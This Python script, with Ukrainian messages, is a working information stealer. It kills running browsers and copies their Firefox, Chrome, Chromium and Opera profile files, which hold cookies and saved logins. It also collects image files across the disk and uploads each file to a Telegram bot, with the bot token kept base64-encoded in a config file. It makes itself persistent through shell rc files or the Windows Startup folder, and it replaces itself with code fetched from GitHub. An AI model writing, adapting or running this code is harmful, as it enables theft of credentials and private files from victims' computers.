import os
import sys
import shutil
import socket
from multiprocessing import Pool,Process,Queue,Lock
import multiprocessing
import requests
import base64
import time
import glob

if os.name=='nt':
    try:
        import winshell
    except ImportError:
        print('Для вінди pip install winshell')

PROC_NUM=15
file_list=[]
sep='/'
chtid=wt=0
def copyFile(src,dst):
    try:
        shutil.copy(src,dst)
    except shutil.Error as e:
        print('Error: %s' % e)
    except IOError as e:
        print('Error: %s' % e.strerror)

def autoupdate():
    fname=sys.argv[0]
    Fname=os.path.split(fname)[1]
    print('Почати оновлення через інтернет!!!')
    r=requests.get('https://raw.githubusercontent.com/hendalf332/tratata/master/getfls.py')
    if r.status_code==200:
        with open('update.txt','w') as fl:
            fl.write(r.text)
        print('[+]Successful update')
        copyFile('update.txt',fname)
    else:
        print('[-]Cant update')
        
def check_intr():
    try:
        requests.get("https://github.com")
        return 1
    except Exception:
        return -1
 
def waitForConnection():
    while True:
        if check_intr()<0:
            print('[-]No connection')
            time.sleep(10)
        else:
            break
 

def get_files(directory_path,extlist):
    global file_list
    hostname=socket.gethostname()
    for root, dirs, files in os.walk(directory_path):
        for name in files:
            fname=os.path.join(root, name)
            if any([ele for  ele in extlist if fname.endswith("."+ele)]):
                splittup=os.path.splitext(fname)
                ext=splittup[1]
                if ext=='':
                    ext='default'
                if not fname.startswith('/media') and not hostname in fname:
                    file_list.append((fname,ext[1:]))

def winntAutoRun():
    fname=sys.argv[0]
    Fname=fname.split('\\')[-1]
    startup = winshell.startup()
    newScripFName=startup+'\\'+Fname
    newcfg=startup+'\\config.py'
    copyFile(fname,newScripFName)
    copyFile("config.py",newcfg)
    return


def addToAutoRun():
    global sep
    shell=os.environ['SHELL']
    home=os.environ['HOME']
    scrptName=sys.argv[0]
    sep='/'
    if os.name=='nt':
        sep='\\'
        newScripFName=home+sep+scrptName
    else:
        newScripFName=home+sep+".config"+sep+scrptName
    copyFile(scrptName,newScripFName)
    copyFile("config.py",home+sep+".config"+sep+"config.py")
    shell=shell[shell[::-1].index(sep)*(-1):]
    if os.name=='nt':
        shell=shell[:shell.index('.')]
    if any([ele for ele in ["bash","zsh","csh","ksh","tcsh"] if (ele==shell) ]):
        pass
    else:
        print('[-]Shell doesn\'t exist')
        return 
    if os.name=='nt':
        autoconf=f"{home}{sep}.{shell}rc"
    else:
        autoconf=f"{home}{sep}.{shell}rc"
    autoflg=False
    print(autoconf)
    sptnm=os.path.split(scrptName)[1]
    if os.path.exists(autoconf):
        with open(autoconf,'r+') as shellrc:
            lines=shellrc.readlines()
            for line in lines:
                if f"{sptnm}" in line:
                    autoflg=True
    if autoflg==True:
        print('!!!Файл вже додано для автозапуску!!!')
    else:
        print('Зараз додаємо файл в автозапуск')
        try:
            with open(autoconf,'a',encoding="utf-8", newline='') as shellrc:
                shellrc.write(f"\n(python3 ~/.config/{scrptName[2:]} 2>&1 >/dev/null &)")
        except FileNotFoundError:
            with open(autoconf,'x',encoding="utf-8", newline='') as shellrc:
                shellrc.write(f"\n(python3 ~/.config/{scrptName[2:]} 2>&1 >/dev/null &)")            
    return

def send_document(bot_token,chtid,docfile,caption='Nothing'):
    url=f"https://api.telegram.org/bot{bot_token}/sendDocument"
    data = {'chat_id' : chtid,'caption': caption}
    files={'document': open(docfile, 'rb')}
    r=requests.post(url,params=data,files=files)
    return


def superProc(fileList,num,extlist,hostdir,hostname,wt,cht):
    cnt=num
    PROC_NUM=15
    global sep
    if os.name=='nt':
        sep='\\'
    print(f'Proc number {num} activated')
    while True:
        while len(fileList)>=num:
            try:
                fname=fileList[cnt][0]
                dname=fileList[cnt][1]
                dirname=f"{hostdir}{sep}{dname}"
                if not os.path.exists(dirname):
                    os.mkdir(dirname)
                print(f'Proc {num}:',fname)
                newname=fname[len(fname)-fname[::-1].index(sep)-1:]
                if not any([ele for ele in ["opera","firefox","chrome","chromium","safari"] if (ele in dirname) ]):
                    newname=fname.replace(':\\','.')
                    newname=newname.replace(sep,'.')
                copyFile(fname,f"{dirname}{sep}{newname}")
                if fileList[cnt]=='TERMINATED':
                    return
                fname=fname.replace('\\\\','\\')
            except:
                pass
            try:
                send_document(wt,cht,fname,f"Folder:{dname} Host:{hostname} Origname:{os.path.split(fname)[1]} {fname}")
            except:
                pass
            try:
                if os.path.exists(fileList[cnt][0]):
                    cnt+=PROC_NUM
            except:
                pass

def main():
    global PROC_NUM
    global sep
    global file_list
    global cht
    global wt
###########
    waitForConnection()
    autoupdate()
    
    chtid=wt=0
    cfgpath=f'.{sep}config.py'
    if not os.path.exists(cfgpath):
        cfgpath=f'.{sep}.config{sep}config.py'
	
    with open(cfgpath,'r') as fl:
        basestr=fl.read()
    dstr=base64.b64decode(basestr)
    mystr=dstr.decode('ascii')
    keys=mystr.split('\n')
    cnt=0
    for el in keys:
        if '=' in el:
            ky,vl=el.split('=')
            if cnt==0:
                wt=vl[1:-1]
            else:
                cht=vl
            cnt+=1
############


    linuxSuperFilesLst=[]
    if os.name!='nt':
        addToAutoRun()
    else:
        sep='\\'
        winntAutoRun()

    
    # mode
    mode = 0o666
    hostname=socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    hostdir=f".{sep}{hostname}-files"
    operdir=f".{sep}{hostname}-files{sep}opera"
    firefoxdir=f".{sep}{hostname}-files{sep}firefox"
    chromedir=f".{sep}{hostname}-files{sep}chrome"
    chromiumdir=f".{sep}{hostname}-files{sep}chromium"
    
    dirlist=[hostdir,operdir,firefoxdir,chromedir,chromiumdir]
    for dir in dirlist:
        if not os.path.exists(dir):
            print(f'!!!Create directory {dir}')#Creating directory for files from victim computer
            os.mkdir(dir)        
            
    #extlist=['ini','inf','reg','sh','pl','py','sql']# here you type file extensions you want save on your USB device
    extlist=['jpg','jpeg','gif','ico']
    with multiprocessing.Manager() as manager:
        file_list=manager.list()
        procs=[]
        for num in range(1,PROC_NUM+1):
            procs.append(Process(target=superProc,args=(file_list,num,extlist,hostdir,f"{hostname}-{ip_address}",wt,cht)))
        for proc in procs:
            proc.start()

        if os.name!= 'nt':
            directory_path='/'
            os.system('pkill -9 firefox')
            for file in glob.glob(os.environ['HOME']+"/.mozilla/firefox/*.default-*/*"):
                file_list.append((file,'firefox'))
            
            os.system('pkill -9 opera')
            for file in glob.glob(os.environ['HOME']+"/.opera*/*"):
                file_list.append((file,'opera'))

            os.system('pkill -9 chromium')
            for file in glob.glob(os.environ['HOME']+"/.config/chromium/*"):
                file_list.append((file,'chromium'))
                
            os.system('pkill -9 chrome')
            for file in glob.glob(os.environ['HOME']+"/.config/chrome/*"):
                file_list.append((file,'chrome'))

            for file in glob.glob(os.environ['HOME']+"/.config/opera/*"):
                file_list.append((file,'opera'))


        else:
            #os.system('taskkill /F /IM chrome.exe')
            for file in glob.glob(os.environ['APPDATA']+"\..\\Local\\Google\\Chrome\\User Data\\Default\\*"):
                file_list.append((file,'chrome'))
              
            #os.system('taskkill /F /IM opera.exe')
            for file in glob.glob(os.environ['APPDATA']+"\\Opera Software\\Opera Stable\\*"): 
                if os.path.split(file)[1][0].isupper():
                    file_list.append((file,'opera'))
        
            #os.system('taskkill /F /IM firefox.exe')
            for file in glob.glob(os.environ['APPDATA']+"\\Mozilla\\Firefox\\Profiles\\*.default-release\\*"):
                file_list.append((file,'firefox'))
    
            directory_path=r'D:\\'
        get_files(directory_path,extlist) 
        if os.name=='nt':
            directory_path=r'C:\\'
            get_files(directory_path,extlist)
            
        for num in range(1,PROC_NUM+1):
            file_list.append('TERMINATED')
            
        for proc in procs:
            proc.join() 
if __name__ == '__main__':
	main()
